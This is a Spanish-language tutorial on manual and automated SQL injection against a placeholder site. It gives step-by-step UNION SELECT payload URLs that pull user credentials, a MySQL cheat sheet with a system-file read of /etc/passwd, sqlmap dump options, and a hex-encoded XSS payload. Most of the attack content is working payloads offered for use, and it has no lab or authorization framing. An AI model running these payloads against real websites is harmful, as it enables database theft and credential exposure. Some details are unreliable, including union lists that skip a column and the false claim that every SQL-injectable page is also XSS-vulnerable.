# INYECCIÓN SQLi - Básico 

## TEMAS

* [¿Qué es una inyección sql?](#¿Qué-es-una-inyección-sql?)
* [¿Porqué ocurre un error sql?](#¿Porqué-ocurre-un-error-sql?)
* [Tipos de inyección sql](#Tipos-de-inyección-sql)
    * [Inyección sql manual](#Inyección-sql-manual)
      * [Detectar una página vulnerable](#Detectar-una-página-vulnerable)
      * [Detectar el número de columnas](#Detectar-el-número-de-columnas)
      * [Usando union select](#Usando-union-select)
      * [Extraer información](#Extraer-información)
         * [mysql sql Injection Cheat Sheet](#mysql-sql-Injection-Cheat-Sheet)
      * [Extraer informacion personalizada](#Extraer-informacion-personalizada)
    * [Inyección sql automatizada con sqlmap](#Inyección-sql-automatizada-con-sqlmap)
      * [¿Qué es sqlmap?](#¿Qué-es-sqlmap?)
      * [Instalación de sqlmap](#Instalación-de-sqlmap)
      * [Uso básico de sqlmap](#Uso-básico-de-sqlmap)
 
 * [Pasar de sql inyection a xss inyection](#Pasar-de-sql-inyection-a-xss-inyection)
    * [¿Qué es una inyección xss?](#¿Qué-es-una-inyección-xss?)
    * [Usando hex para esconder payloads](#Usando-hex-para-esconder-payloads)
 


## ¿Qué es una inyección sql?

Sql Injection ó Inyección SQL es una vulnerabilidad que permite al atacante enviar o “inyectar” instrucciones SQL de forma maliciosa y malintencionada.

## ¿Porqué ocurre un error sql?

Un error SQL ocurre normalmente con la mala filtración de las variables en un programa que tiene o crea SQL, generalmente cuando solicitas a un usuario entradas de cualquier tipo y no se encuentran validadas, como por ejemplo su nombre y contraseña, pero a cambio de esta información el atacante envía una sentencia SQL invasora que se ejecutará en la base de datos.

## Tipos de inyección sql

Una inyección sql puede ser explotada de 2 maneras diferentes, manualmente, es decir, el atacante inyectara a mano la secuencia de comandos para así generar la acción dentro de la base de datos.

Por otra parte tenemos la inyección automatizada con sqlmap, sqlmap es una herramienta diseñada especialmente para este tipo de ataques, se encarga de analizar la página, ver si es vulnerable y atacar, se dice que es automatizada ya que la herramienta hace todo por si sola, el usuario solo necesita ingresar las opciones que quiera usar para hacer más efectivo el escaneo.

## Inyección sql manual 

### Detectar una página vulnerable

Una de las principales cosas en donde nos tenemos que fijar para detectar si una página es vulnerable a inyección sql es en sus parametros, imaginemos lo siguiente:

Encontramos una página común y corriente la cual utiliza muchos parametros por el metodo GET (recordemos que el metodo GET es cuando la página envia los datos usando la URL), entonces tenemos algo como esto:

`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1`

En este ejemplo tenemos 3 parametros, los cuales son:

```
id=1
id2=1
id3=1
```

Ahora, para detectar si la página es vulnerable, una de las cosas más sencillas es usar un simple ' al final de cada parametro para ver si nos genera un error en la base de datos. 

Entontes tenemos lo siguiente:

Agregamos un `'` al final del primer paramero, pero no nos genera ningun error:

`http://www.paginaparaejemplo.com/algo.php?id=1'&id2=1&id3=1`

Agregamos un `'` al final del segundo paramero, pero no nos genera ningun error:

`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1'&id3=1`

Agregamos un `'` al final del ultimo paramero, pero aquí si nos devuelve un error:

`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1'`

La página nos muestra una leyenda como esta:

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax`

Ahora que tenemos el parámetro vulnerable, nos pasamos a lo siguiente.

### Detectar el número de columnas

Ya tenemos el parámetro vulnerable, ahora tenemos que identificar el número de columnas usadas por la página, para esto tenemos los siguientes comandos:

`order by` y `group by`

Aquí tenemos que ir testeando el numero de columnas, aquí un ejemplo de como usar el order by y el group by:

```
1' ORDER BY 1 --+	
1' ORDER BY 2 --+	
1' ORDER BY 3 --+	
1' ORDER BY 4 --+	
etc...
```
```
1' GROUP BY 1--+	
1' GROUP BY 2--+	
1' GROUP BY 3--+	
1' GROUP BY 4--+	
etc...
```

Aquí lo que estamos buscando es que la pagina nos genere un error al inyectar un numero que supera las columnas usadas por la página, para que sea un poco mas entendible vamos a verlo de esta manera:

Imaginamos que la pagina tiene `23` columnas, volviendo al ejemplo anterior en donde ya descubrimos el parámetro vulnerable nos quedaria algo como esto:


```

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 1 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 2 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 3 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 10 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 20 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 23 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 24 --+ #tenemos un error

```

Al nosotros sobrepasar el número de columnas usadas por la página, esta nos mostrará un error como el siguiente: 

`La consulta no se realizo: Unknown column '24' in 'order clause'`

Gracias a esto, descubrimos que la página usa 23 columnas.

### Usando union select

Ahora llega el turno de `union select`, lo que hacen estos comandos es "darnos paso" por así decirlo a ejecutar sentencias directamente en la base de datos y que esto se vea reflejado en la página.

Para usar `union select`, tenos que poner el total de columnas que descubrimos anteriormente. Volviendo a el ejemplo que tenemos planteado, nos quedaría de la siguiente manera:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```

Lo que eso generará es que la página nos muestre los números de las columnas que son vulnerables para inyectar en ellas, esta parte es muy importante ya que tenemos que ser muy curiosos para notar los cambios, en algunos casos los cambios son muy drásticos y se notan demasiado, pero en otros casos los cambios son demasiado sutiles.

Para este ejemplo, imaginemos que la página es vulnerable en las columnas `3` , `5` y `20`. La página nos mostrará estos números en algún lugar.


### Extraer información 

Ahora que tenemos el número de columnas y hemos identificado las columnas inyectables sigue extraer e inyectar informacion, para hacer eso necesitamos inyectar directamente en la columna vulnerable, pasando al ejemplo anterior y al saber que la columna `5` es vulnerable, nos quedara algo como esto:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,'soy vulnerable',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```

Al inyectar `'soy vulnerable'` le estamos diciendo a la página que queremos que por la columna número 5 nos muestre la frase `soy vulnerable` ya que estamos inyectando un string directamente en la columna vulnerable 

Algo que recomiendo mucho es usar `@@datadir`, Este nos muestra en donde esta montada la base de datos, pero al mismo tiempo nos nuesta informacion con la que podemos determinar que base de datos de esta usando, imaginemos que inyectamos y nos muestra esto:


```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,@@datadir,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```
Nos muestra:

`/var/lib/mysql/`

Esto significa que la base de datos esta en esa ruta y al mismo tiempo nos dice que la base de datos usada es `mysql`, entonces nos enfocamos en esa base de datos.

#### mysql sql Injection Cheat Sheet

Al saber que la base de datos con la que se maneja la página es `mysql`, vamos a ver un pequeño `Cheat Sheet` para esta base de datos.

¿Qué es un Cheat Sheet?

Basicamente es una lista con muchos "trucos" se puede decir, como es la traduccion a español de esa frase `Cheat Sheet = hoja de trucos`. En esta vamos a encontrar desde las consultas mas basicas hasta consultas un poco mas avanzadas que nos van a ayudar demasiado para trabajar en nuestra inyección sql.

```
|   Version   |  SELECT @@version o SELECT version()  | nos da la version de la base de datos  |

| Current User | SELECT user() o SELECT system_user() | nos da el usuario que tenemos |

| List Users | SELECT user FROM mysql.user | nos muestra todos los usuarios |

| Database  | SELECT database() | nos muestra la base de datos en la que estamos |

| Lista de bases de datos | SELECT schema_name FROM information_schema.schemata | nos muestra las bases de datos  |

| List tables | SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’ | nos muestra las tablas de la base de datos elegida |

| List Columns | SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’ | nos muestra las columnas de la tabla elegida |

| Local File Access |  UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)  | si es posible, nos deja leer archivos del sistema |

| DB location | SELECT @@datadir | nos muestra la direccion en donde esta instalada la base de datos | 
 
```

### Extraer informacion personalizada

Ahora vamos a analizar mas a detalle como sacar informacion de la base de datos, regresando al ejemplo con el que estamos practicando, vamos a usar `database()`, que como ya lo vimos nos sirve para que nos muestre el nombre de la base de datos con la que estamos trabajando;

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```
Nos muestra:

`nombre_DB`

ahora tenemos el nombre de la base de datos.

lo siguiente que vamos a hacer es sacar las tablas de la base de datos, aquí hay 2 maneras:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from information_schema.tables --+
```
Nos muestra:

`las principales tablas de la base de datos information_schema`

para sacar las tablas de la base de datos que sacamos antes: `nombre_DB` hacemos lo siguiente:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from information_schema.tables where table_schema=database() --+
```

Nos muestra las principales tablas de la base de datos `nombre_DB`:

supongamos que encontramos las tablas:

`usuarios, otra_tabla, hola_soy_otra_tabla`

logicamente la que nos interesa es la tabla `usuarios`

Ahora vamos a entrar a la tabla `usuarios` dentro de la base de datos `nombre_DB` para sacar las columnas:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from information_schema.comlumns where table_name="usuarios" --+
```

Nos muestra:

`id, name, email, passwd`

que son generalmente las que se pueden encontrar.

Ahora, para mostrar el contenido de esas columnas: `id, name, email, passwd` solo tenemos que recordar en que tabla estan para asi poder llamarlas, así;

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(id,name,email,passwd),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from usuarios --+
```
Nos muestra:

`0pepitopepito@correo.comcontraseñasegura`

si se dan cuenta esta todo junto por que asi es como lo estamos llamando, para arreglar esto vamos a hacer uso de la codificacion `hex` y del simbolo `:`.

el simbolo `:` en `hex` nos queda así: `0x3a`.

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(id,0x3a,name,0x3a,email,0x3a,passwd),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from usuarios --+
```
Nos muestra:

`0:pepito:pepito@correo.com:contraseñasegura`

ahora más entendible.

## *Como nota* 
Para realizar estos "ataques" personalizados usamos algunas cosas que me gustaría explicar:

1-`gruop_concat()`: Esta es una funcion que nos permite concatenar valores, de tal manera que lo estamos usando para que nos devuelva los valores que nosotros elegimos desde la tabla seleccionada.

2-`group_concat(table_name) from information_schema.tables`: Esta sentencia nos devuelve el nombre de las tablas (fijense que estamos haciendo uso de `group_concat(table_name)`) desde information_schema.tables, esto significa que estamos haciendo una sentencia que nos refleja el nombre de las tablas que estan dentro de la base de datos llamada information_schema.

3-`group_concat(table_name) from information_schema.tables where table_schema=database()`: Este secuencia es muy parecida a la anterior, solo que aquí se agrega otro comando: `where` que se utiliza para hacer un poco mas personalizada la consulta, en este caso la estamos usando para dirigir la consulta dentro de la base de datos llamada `nombre_DB`









## Inyección sql automatizada con sqlmap

### ¿Qué es sqlmap?

SQLMap es una herramienta para explotar la vulnerabilidad de SQL injection. Esta herramienta automatiza el ataque para así explotar la página.

### Instalación de sqlmap

Para empezar me gustaría dejar la página oficial aquí: `http://sqlmap.org/`

Sqlmap es una herramienta que funciona en python en sus versiones: 2.6, 2.7 y 3.x en todas las plataformas, así que no hay problema para usarlo, personalmente lo he usado en windows, linux y en termux y en todas funciona exelente.

Lo primero que tenemos que hacer es tener instalado git para poder clonar su repositorio oficial a nuestro dispositivo, el sitio en git es el siguiente:

https://github.com/sqlmapproject/sqlmap.git

para clonarlo usamos lo siguiente:

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

una vez que tengamos clonado el repositorio entramos a la carpeta `sqlmap-dev` y ejecutamos el archivo `sqlmap.py`:

`python sqlmap.py`




### Uso básico de sqlmap

Para ver las opciones de ayuda de esta herramienta basta con usar lo siguiente:

`sqlmap.py -h`

Lo que nos devolvera las opciones basicas para hacer un correcto uso de esta herramienta, algo que se tiene que entender bien es el correcto orden de ejecuion para agregar las opciones:

`sqlmap.py --opcion -u URL`

En las opciones podemos resaltar las mas generales e importantes, por ejemplo:

```
| --random-agent | Lo cual nos permite "cambiar" el user agent con el cual se ejecutan las consultas |

| --proxy=proxy | Lo cual nos permite conectarnos a la página que queremos escanear por medio de un proxy |

| -p parametro | Se utiliza para determinar el parametro que queremos analizar |

| --level=1-5 | Este nos permite modificar el nivel de con el que queremos hacer el escaneo, por defecto esta en el en nivel 1 pero podemos cambiarlo hasta el 5 para hacer mas intrisivo el escaneo |

| --risk=1-3 | De igual manera que --level, risk nos permite cambiar el nivel con el que queremos hacer el escaneo agregando mas agresividad pero al mismo tiempo haciendo mas ruido, este se puede configurar desde el 1 al 3 vieniendo por defecto en el número 1 |

| --current-user | Nos extrar el nombre de usuario con el que interactuamos con la base de datos |

| --current-db | Nos extrae el nombre de la base de datos en la cual estamos |

| --dbs | Nos extrerá el numero de bases de datos y nos mostrará el nombre de cada una de ellas |

| -D nombre | Nos permite entrar en la base de datos seleccionada |

| --tables | Nos mostrará el numero de tablas dentro de una base de datos y los nombres de cada una de las tablas |

| -T nombre | Nos permite entrar en la tabla seleccionada | 

| --column | Nos extraerá el número de las columnas dentro de una tabla y nos mostrara el nombre de cada una de ellas |

| -C nombre | Nos permite seleccionar la columna |

| --dump | Nos permite extraer contenido de la base de datos |

| --dump-all | Nos extrae todo de la base de datos |


```

Una vez que ya conocemos las opciones basicas de la herramienta vamos a ver un ejemplo de como usarla:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1"`






## Pasar de sql inyection a xss inyection

Ahora que hemos visto como hacer un "ataque" de inyección sql, vamos a pasar de una vulnerabilidad a otra, esta será una inyección xss. Todas las paginas que son vulnerables a sql inyection tambien son vulnerables a xss inyection.

### ¿Qué es una inyección xss?

Este "ataque" consiste en inyectar código malicioso en páginas web benignas. El atacante inyecta código desde el lado del cliente, de forma que por una mala configuración de la página web, este código se muestre a otros usuarios.

### Usando hex para esconder payloads

El sistema hexadecimal es un método de numeración posicional que utiliza como base el número 16 (Base-16), es decir, que existen 16 símbolos de dígitos posible.

Sus números están representados por los 10 primeros dígitos de la numeración decimal y el intervalo del número 10 al número 15 se representa por las letras del alfabeto: A, B, C, D, E y F.

Este es el método con el cual vamos a inyectar xss dentro de una vulnerabilidad sql, retomando el ejemplo de la pagina vulnerable nos quedaria algo así:

De igual manera, vamos a hacer uso de la columna vulnerable, en este caso recordemos que la columna `5` es vulnerable.

Para convertir cadenas a hex hay muchas herramientas y muchas páginas que nos permiten hacer eso, una de ellas es esta:

https://www.convertstring.com/es/EncodeDecode/HexEncode


un payload de inyección xss muy basico es el siguiente:

`<script>alert(1)</script>` 

en hex nos queda asi:

`3C7363726970743E616C6572742831293C2F7363726970743E`

y al inyectar de esta manera:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,3C7363726970743E616C6572742831293C2F7363726970743E,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```
Nos muestra:

`un error`

por qué?? bueno, la página nos muestra el error ya que no puede leer la cadena en hex asi como esta, para que lo lea de manera correcta tenemos que agregar `0x` en el inicio de la cadena convertida en hex, de esta manera le estamos diciendo a la pagina que queremos que por medio de esa columna vulnerable nos ejecute esa cadena en `hex`, así:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,0x3C7363726970743E616C6572742831293C2F7363726970743E,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```
Nos muestra:

`una alerta`

Listo, de esta manera estamos pasando a una inyección xss dentro de una inyección sql.


